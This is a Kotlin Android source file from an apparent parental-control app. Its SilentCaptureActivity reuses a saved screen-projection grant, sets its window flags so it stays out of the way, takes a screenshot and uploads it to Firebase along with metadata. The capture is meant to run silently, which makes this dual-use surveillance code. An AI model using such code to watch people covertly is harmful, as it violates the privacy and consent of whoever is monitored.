package com.controlparental.jerico

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.annotation.RequiresApi
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object ProjectionPermissionHolder {
    var resultCode: Int? = null
    var projectionData: Intent? = null
}

class SilentCaptureActivity : Activity() {

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    @RequiresApi(Build.VERSION_CODES.R)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL)

        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intentResultCode = intent.getIntExtra("resultCode", Int.MIN_VALUE)
        val intentProjectionData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra("projectionData", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra("projectionData")
        }

        val resultCode = if (intentResultCode != Int.MIN_VALUE) intentResultCode else ProjectionPermissionHolder.resultCode
        val projectionData = intentProjectionData ?: ProjectionPermissionHolder.projectionData

        Log.d("SilentCaptureDebug", "📥 resultCode final: $resultCode")
        Log.d("SilentCaptureDebug", "📥 projectionData final: $projectionData")

        if (resultCode == Activity.RESULT_OK && projectionData != null) {
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, projectionData)
            captureScreen()
        } else {
            Log.e("SilentCaptureDebug", "❌ No hay datos guardados válidos o permiso denegado, abortando")
            finish()
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun captureScreen() {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val display =
            display

        display?.let {
            val context = createDisplayContext(it)
            context.display?.apply {
                metrics.widthPixels = mode.physicalWidth
                metrics.heightPixels = mode.physicalHeight
                metrics.densityDpi = context.resources.displayMetrics.densityDpi
            }
        }

        val density = metrics.densityDpi
        val width = metrics.widthPixels
        val height = metrics.heightPixels

        Log.d("SilentCaptureDebug", "📐 Preparando captura con resolución ${metrics.widthPixels}x${metrics.heightPixels} y densidad ${metrics.densityDpi}")
        if (width <= 0 || height <= 0) {
            Log.e("SilentCaptureDebug", "❌ Dimensiones inválidas: width=$width, height=$height. Abortando captura.")
            finish()
            return
        }
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )
        Log.d("SilentCaptureDebug", "📺 VirtualDisplay creado: $imageReader")

        var imageCaptured = false

        imageReader?.setOnImageAvailableListener({
            Log.d("SilentCaptureDebug", "🟠 Listener activado para captura de imagen")
            if (imageCaptured) return@setOnImageAvailableListener
            val image = it.acquireLatestImage()
            if (image == null) {
                Log.w("SilentCaptureDebug", "⚠️ image es null")
                return@setOnImageAvailableListener
            }
            Log.d("SilentCaptureDebug", "📸 Imagen capturada")
            imageCaptured = true
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                uploadToFirebase(bitmap)
            } catch (e: Exception) {
                Log.e("SilentCaptureDebug", "❌ Error al procesar la imagen: ${e.message}")
            } finally {
                android.os.Handler(Looper.getMainLooper()).postDelayed({
                    image.close()
                    stopProjection()
                }, 300)
            }
        }, android.os.Handler(Looper.getMainLooper()))
    }

    private fun stopProjection() {
        virtualDisplay?.release()
        mediaProjection?.stop()
        imageReader?.close()
    }

    private fun uploadToFirebase(bitmap: Bitmap) {
        val uid = FirebaseAuth.getInstance().currentUser?.uid ?: return
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val path = "screenshots/$uid/$timestamp.jpg"

        Log.d("SilentCaptureDebug", "⬆️ Subiendo imagen a Firebase Storage en la ruta: $path")
        val baos = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val data = baos.toByteArray()

        val storageRef = FirebaseStorage.getInstance().reference.child(path)
        val uploadTask = storageRef.putBytes(data)
        uploadTask.addOnSuccessListener {
            Log.d("SilentCaptureDebug", "✅ Imagen subida con éxito, obteniendo URL de descarga")
            storageRef.downloadUrl.addOnSuccessListener { uri ->
                saveMetadataToFirestore(uid, uri)
            }.addOnFailureListener { Log.e("SilentCaptureDebug", "❌ Fallo al obtener URL de descarga") }
        }.addOnFailureListener { Log.e("SilentCapture", "Upload failed") }
    }

    private fun saveMetadataToFirestore(uid: String, uri: Uri) {
        val firestore = FirebaseFirestore.getInstance()
        val metadata = mapOf(
            "url" to uri.toString(),
            "timestamp" to System.currentTimeMillis()
        )
        val deviceId = FirebaseAuth.getInstance().currentUser?.uid ?: "unknown_device"
        firestore.collection("users")
            .document(uid)
            .collection("devices")
            .document(deviceId)
            .collection("screenshots")
            .add(metadata)
            .addOnSuccessListener {
                Log.d("SilentCaptureDebug", "✅ Metadata guardada en Firestore")
                finish()
            }
            .addOnFailureListener {
                Log.e("SilentCaptureDebug", "❌ Fallo al guardar metadata en Firestore")
                finish()
            }
    }
}